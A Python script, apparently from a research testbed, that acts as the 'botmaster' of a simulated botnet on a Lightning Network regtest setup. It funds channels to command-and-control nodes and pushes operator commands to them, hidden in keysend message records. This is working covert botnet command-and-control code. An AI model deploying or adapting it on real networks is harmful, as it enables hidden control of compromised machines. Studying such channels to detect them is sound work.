#NOTE!! this file should be in the botmaster/ directory that gets mounted to the BM docker container
import subprocess
import argparse
import json
import logging
import os
import time
import re
import random
from pathlib import Path

# import the ln_checker file
import ln_checker

HOST_NAME = os.getenv("CONTAINER_NAME")
LOG_DIR = Path('logs')
LOG_DIR.mkdir(parents=True, exist_ok=True)
logging.basicConfig(filename=str(LOG_DIR / 'bm_log.log'), level=logging.INFO, format=f"{HOST_NAME} %(asctime)s - %(levelname)s - %(message)s", force=True)

# Filenames from environment variables or defaults
INNOCENT_ADDRESS_FILE = os.getenv('NODE_ADDRESS_FILE', 'innocentAddress.txt')
INNOCENT_ID_FILE = os.getenv('NODE_ID_FILE', 'innocentID.txt')
CC_ADDRESS_LIST_FILE = os.getenv('NODE_MANAGER_ADDRESS_LIST', 'CC_address_list.txt')

# Read Innocent Node Address and ID from files
# These files should be in the working directory
with open(os.path.basename(INNOCENT_ADDRESS_FILE), 'r') as address_file:
    INNOCENT_NODE_ADDRESS = address_file.read().strip()
with open(os.path.basename(INNOCENT_ID_FILE), 'r') as id_file:
    INNOCENT_NODE_ID = id_file.read().strip()

with open(os.path.basename(CC_ADDRESS_LIST_FILE), 'r') as id_file:
    CC_ADDRESS_LIST = id_file.read().strip()


DISCOVERY_RULE_DIVISOR = ln_checker.DISCOVERY_RULE_DIVISOR
BM_CONNECTED_NODES = set()  # To track already connected nodes
UNIQUE_FUNDING_AMOUNT = ln_checker.BOTMASTER_RULE_DIVISOR * 100
COUNTER_FILE = "counter.txt"  # File to store the counter
FUNDED_NODE_FILE = "funded_node.txt"
AUTO_TEST_COUNT = 10 # How many commands for auto_test, default is 100

THIS_NODE = None

RETRY_MAX = 3

# Global variable for the node BM funded a channel with
FUNDED_NODE_IDS = []
# The TLV record type used for standard text messages in keysend.
MESSAGE_TLV_TYPE = "34349334"

def load_counter():
    """
    Load the counter from the counter file. If the file doesn't exist, initialize it to 1.
    """
    if os.path.exists(COUNTER_FILE):
        with open(COUNTER_FILE, "r") as file:
            try:
                return int(file.read().strip())
            except ValueError:
                return 1  # If the file is corrupted, reset to 1
    return 1

def save_counter(counter):
    """
    Save the counter to the counter file.
    """
    with open(COUNTER_FILE, "w") as file:
        file.write(str(counter))




def run_lightning_cli(command):
    try:
        logging.info(f"run_lightning_cli: Running command: {' '.join(command)}")
        result = subprocess.run(
            ["lightning-cli", "--regtest"] + command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        if result.returncode != 0:
            logging.info(f"run_lightning_cli: Command failed with error: {result.stderr.strip()}")
            return None
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        # This is where the error from lightning-cli lives!
        logging.error(f"lightning-cli command failed with exit code {e.returncode}")
        logging.error(f"  lightning-cli STDOUT: {e.stdout.strip()}")
        logging.error(f"  lightning-cli STDERR: {e.stderr.strip()}") 
    except Exception as e:
        logging.error(f"run_lightning_cli: Exception occurred: {e}")
        return None


def get_node_info():
    """
    Retrieve the BM node's own information, including its ID.
    """
    output = run_lightning_cli(["getinfo"])
    return json.loads(output) if output else None


def connect_to_innocent():
    """
    Connect to the Innocent node.
    """
    if ln_checker.does_connection_exist(INNOCENT_NODE_ID):
        logging.info(f'Already connected to innocent node')
    else:
        logging.info(f"Connecting to Innocent node: {INNOCENT_NODE_ADDRESS}")
        run_lightning_cli(["connect", INNOCENT_NODE_ADDRESS])


#this is for the demo instead of using meshconnect, CCs can look at the shared address list and connect to each other by themselves
def demoGetAddressAndConnect(node_ID):
    """
    Reads the CC_address_list.txt file, extracts the full address corresponding to the given node ID,
    and connects to the node using the lightning-cli command.

    :param node_ID: The ID of the node to connect to.
    """
    try:
        # Read the CC_address_list.txt file
        with open(os.path.basename(CC_ADDRESS_LIST_FILE), 'r') as id_file:
            CC_ADDRESS_LIST = id_file.readlines()

        # Find the full address corresponding to the node_ID
        full_address = None
        for line in CC_ADDRESS_LIST:
            address = line.split()[1]
            if address.startswith(node_ID):
                full_address = address.strip()
                break

        # If no matching address is found, log and exit
        if not full_address:
            logging.error(f"Node ID {node_ID} not found in CC_address_list.txt.")
            return

        # Connect to the node using the full address
        logging.info(f"Connecting to node: {full_address}")
        result = run_lightning_cli(["connect", full_address])

        if result:
            logging.info(f"Successfully connected to node {node_ID} at {full_address}.")
        else:
            logging.error(f"Failed to connect to node {node_ID} at {full_address}.")
    except Exception as e:
        logging.error(f"demoGetAddressAndConnect: Exception occurred: {e}")

# This assumes that the BM node knows the address of every CC node, and so can just connect at random
def discover_cc_nodes():
    """
    Discover CC nodes that satisfy the discovery rule.
    """
    try:
        logging.info("Discovering CC nodes.")
        # read the file that contains all the CC adresses
        with open(os.path.basename(CC_ADDRESS_LIST_FILE), 'r') as id_file:
                address_list = id_file.readlines()
        
        address_list.sort(key=lambda x: int(re.search(r'CC(\d+)', x).group(1)))
        
        valid_nodes = []
        for node in address_list:
            line = node.split()
            node_name = line[0].strip()
            
            address = line[1].strip()
            valid_nodes.append(address.split('@')[0])
        logging.info(f"Valid CC nodes discovered: {valid_nodes}")

        return valid_nodes
    except Exception as e:
            logging.error(f"discover_cc_nodes: Exception occurred: {e}")
            return []


def pick_nodes_by_name(node_names, address_list_lines):
    '''Select specific nodes by CC name from the address list.
    address_list_lines: list of lines from CC_address_list.txt, each "CCN pubkey@host:port"
    Returns list of pubkeys.
    '''
    name_to_pubkey = {}
    for line in address_list_lines:
        parts = line.split()
        if len(parts) >= 2:
            cc_name = parts[0].strip()
            pubkey = parts[1].strip().split('@')[0]
            name_to_pubkey[cc_name] = pubkey

    selected = []
    for name in node_names:
        name = name.strip()
        if name in name_to_pubkey:
            selected.append(name_to_pubkey[name])
        else:
            logging.warning(f'{name} not found in network, skipping.')
    return selected

def pick_random_nodes(num_nodes, valid_nodes):
    '''
    Pick num_nodes random nodes from a set of nodes.
    Returns a list.
    '''
    return random.sample(valid_nodes, num_nodes)

def fund_channels(node_ids=None, count=1):
    '''
    Discover valid CC nodes and fund channels.
    Will return saved funded channels if they exist, to fund completely new channels
    you must call disconnect_all_channels() first.
    Parameters:
        node_ids: list of CC node names to connect to (e.g., ['CC5', 'CC12'])
        count: number of random CC nodes to connect to (used when node_ids is None)
    '''
    # Load funded nodes if we have this saved
    funded_nodes = load_funded_nodes()

    if node_ids:
        # Explicit node selection: resolve names to pubkeys
        with open(os.path.basename(CC_ADDRESS_LIST_FILE), 'r') as f:
            address_lines = f.readlines()
        target_nodes = pick_nodes_by_name(node_ids, address_lines)
        final_num_channels = len(target_nodes)
    else:
        target_nodes = None
        final_num_channels = count

    # if the nodes are already funded then just return those.
    if len(funded_nodes) == final_num_channels:
        return funded_nodes

    # Discover all CC nodes
    discovered_nodes = discover_cc_nodes()
    while not discovered_nodes:
        logging.info("No valid CC nodes found for funding. Retrying in 10 seconds")
        time.sleep(10)
        discovered_nodes = discover_cc_nodes()

    valid_cc_nodes = [cc_node for cc_node in discovered_nodes if cc_node not in funded_nodes]

    # Select nodes to connect to
    if target_nodes:
        new_nodes = [n for n in target_nodes if n not in funded_nodes]
    else:
        new_nodes = pick_random_nodes(min(count, len(valid_cc_nodes)), valid_cc_nodes)

    for _ in range(RETRY_MAX):
        for node in new_nodes:

            # first check if we have a channel with this node, if we do, then we can skip everything
            if node in funded_nodes:
                continue
            elif (node not in funded_nodes) and ln_checker.has_channel_with(node):
                logging.warning(f'fund_channels: Trying to fund a channel with {node} but channel already exists.')
                funded_nodes.add(node)
                continue

            # no channel with the node
            demoGetAddressAndConnect(node)
            connect_and_channel_node(node)
            # make sure channel is ready to receive
            ln_checker.wait_node_activated(node)

            if not ln_checker.has_channel_with(node):
                logging.error(f'fund_channels: ERROR: Could not connect to node.')
                print(f'Error: Could not open channel with {node}')
                continue
            else:
                print(f'Successfully opened channel with {node}')
                logging.info(f'Successfully opened channel with {node}')
                funded_nodes.add(node)
        else:
            print(f'BM node has channeled with {final_num_channels} nodes successfully.')
            logging.info(f'fund_channels: BM node has channeled with {final_num_channels} nodes successfully.')
            break

    if len(funded_nodes) != final_num_channels:
        print(f'BM has failed to channel with {final_num_channels} nodes. Aborting')
        logging.error(f'fund_channels: Only channels with {len(funded_nodes)} instead of {final_num_channels} nodes. Returning None')
        return []
    else:
        return funded_nodes
    


def load_funded_nodes() -> set:
    '''
    Load the funded nodes from a file.
    '''
    funded_nodes = set()
    if os.path.exists(FUNDED_NODE_FILE):
        # load funded nodes from the saved text file, which should be comma delineated
        logging.info(f'Found funded node file, loading.')
        try:
            with open(FUNDED_NODE_FILE, 'r') as file:
                file_output = file.read().strip()
                funded_nodes = set(file_output.split(','))
                logging.debug(f'load_funded_nodes: Funded nodes are {funded_nodes}')
        except Exception as e:
            # something wrong happened, log it and return an empty array
            logging.error(f'load_funded_nodes: ERROR: {e}')
            return set()
        # we check if we have a channel with each of these nodes
        verified_nodes = set()
        for node in funded_nodes:
            if ln_checker.has_channel_with(node):
                verified_nodes.add(node)
            else:
                logging.warning(f'load_funded_nodes: Warning: Node {node} is saved but BM has no channel with it.')
        funded_nodes = verified_nodes
    else:
        logging.debug(f'load_funded_nodes: No files found at {FUNDED_NODE_FILE}.')

    return funded_nodes

def interactive_command_sender(funded_nodes):
    """
    Allow the user to send commands interactively to the node BM funded a channel with,
    appending a persistent counter to the user input.
    """
    counter = load_counter()  # Load the counter from the file

    print(f"Type 'quit' to exit.")

    while True:
        user_input = input("Enter command: ")
        if user_input.lower() == 'quit':
            print("Exiting.")
            break
        send_msg(user_input, counter, funded_nodes)
        counter = load_counter()  # Reload after send_msg increments it


    save_counter(counter)  # Save the counter when exiting

def encode_msg(in_msg):
    return in_msg.encode('utf-8').hex()

def send_msg(message, counter, funded_nodes):
    # Concatenate the user input with the counter
    message_with_counter = f"{message}|{counter}"

    tlv_json = json.dumps({MESSAGE_TLV_TYPE : encode_msg(message_with_counter)})

    from concurrent.futures import ThreadPoolExecutor

    def _send_to_node(node):
        """Send keysend to a single injection point. Returns True on success."""
        # Ensure channel is active, retry if needed
        for _ in range(RETRY_MAX):
            if ln_checker.wait_node_activated(node):
                break
            else:
                logging.info(f'No active channel with {node} - attempting to re-channel.')
                if not connect_and_channel_node(node):
                    logging.error(f'Could not reconnect to {node}.')
        else:
            logging.error(f'Cannot activate channel with {node} after {RETRY_MAX} tries.')
            return False

        command = ["lightning-cli", "--regtest", "keysend",
                   f"destination={node}", f"amount_msat=1",
                   f"extratlvs={tlv_json}"]
        try:
            result = subprocess.run(command, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, text=True, check=True)
            logging.info(f"Keysend to {node} succeeded.")
            return True
        except Exception as e:
            logging.error(f"Keysend to {node} failed: {e}")
            return False

    # Send to ALL injection points in parallel
    with ThreadPoolExecutor(max_workers=len(funded_nodes)) as pool:
        results = list(pool.map(_send_to_node, funded_nodes))

    succeeded = sum(results)
    if any(results):
        logging.info(f"Command '{message_with_counter}' sent to {succeeded}/{len(funded_nodes)} injection points.")
        print(f"Command '{message_with_counter}' sent to {succeeded}/{len(funded_nodes)} injection points.")
        save_counter(counter + 1)
    else:
        logging.error(f'All {len(funded_nodes)} injection points failed for message {message_with_counter}.')
        
def load_this_node ():
    global THIS_NODE 
    output = get_node_info()
    THIS_NODE = output.get('id')

def connect_and_channel_node(node):
    '''
    Connect and open a channel with a node
    '''
    if ln_checker.has_channel_with(node):
        logging.info(f"connect_and_channel_node: Already has channel with {node}")
        return True
    
    try:
        logging.info(f"fund_channels: Funding channel with node {node} (amount: {UNIQUE_FUNDING_AMOUNT}).")
        ln_checker.check_funds()
        run_lightning_cli(["fundchannel", node, str(UNIQUE_FUNDING_AMOUNT)])
        logging.info(f'funds_channels: Funding channel with {node}')
        return True
    except Exception as e:
        logging.error(f'connect_and_channel_node: ERROR: {e}')
        return False
    
def disconnect_all_channels(connected_nodes):
    '''
    Disconnect all nodes in connected_nodes
    Parameters:
        connected_nodes: Nodes to disconnect
    '''
    for node in connected_nodes:
        disconnect_node(node)

def disconnect_node(node):
    '''
    Disconnect completely from a node
    '''
    try:
        logging.info(f'Disconnecting and closing channel with {node}')
        run_lightning_cli(["close", f"id={node}"])
        run_lightning_cli(["disconnect", node])
    except Exception as e:
        logging.error(f'disconnect_node: ERROR: {e}')  


def main(goal, message, node_ids=None, count=1, start_fresh=False):

    """
    Main Botmaster logic.
    """
    logging.info("Starting Botmaster Node Script")
    connect_to_innocent() # we need to connect to innocent to see channel gossip
    load_this_node()
    if node_ids:
        logging.info(f"Funding channels with specific nodes: {node_ids}")
    else:
        logging.info(f"Funding {count} random channel(s)")
    # Fund channels with specified or random CC nodes
    funded_nodes = fund_channels(node_ids=node_ids, count=count)

    if start_fresh:
        logging.info(f'main: Closing and disconnceting from all nodes. Starting fresh')
        save_counter('0')
        disconnect_all_channels(funded_nodes)

    elif not funded_nodes:
        funded_nodes = fund_channels(node_ids=node_ids, count=count)

    # Allow interactive command sending
    if goal == 1:
        interactive_command_sender(funded_nodes)
    # used for automatic testing
    elif goal == 2:
        counter = load_counter()
        send_msg(message, counter, funded_nodes)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='BotMaster Command and Control Manager')
    parser.add_argument('--msg',
                        help='The message to send to the botnet.')
    parser.add_argument('--node-ids', type=str, default=None,
                        help='Comma-separated CC node names to connect to (e.g., CC5,CC12,CC30).')
    parser.add_argument('--count', type=int, default=1,
                        help='Number of random CC nodes to connect to (used when --node-ids not provided).')
    parser.add_argument('--fresh', action='store_true',
                        help='Close and disconnect all previously funded nodes.')

    args = parser.parse_args()

    node_ids = None
    if args.node_ids:
        node_ids = [n.strip() for n in args.node_ids.split(',')]

    if args.msg:
        main(2, args.msg, node_ids=node_ids, count=args.count, start_fresh=args.fresh)
    else:
        desc = f'nodes {node_ids}' if node_ids else f'{args.count} random node(s)'
        if input(f'Starting botmaster. Will connect to {desc}. Continue? y/n').lower() in ['y', 'yes']:
            main(1, args.msg, node_ids=node_ids, count=args.count, start_fresh=args.fresh)
        else:
            print(f'Exiting Botmaster script.')
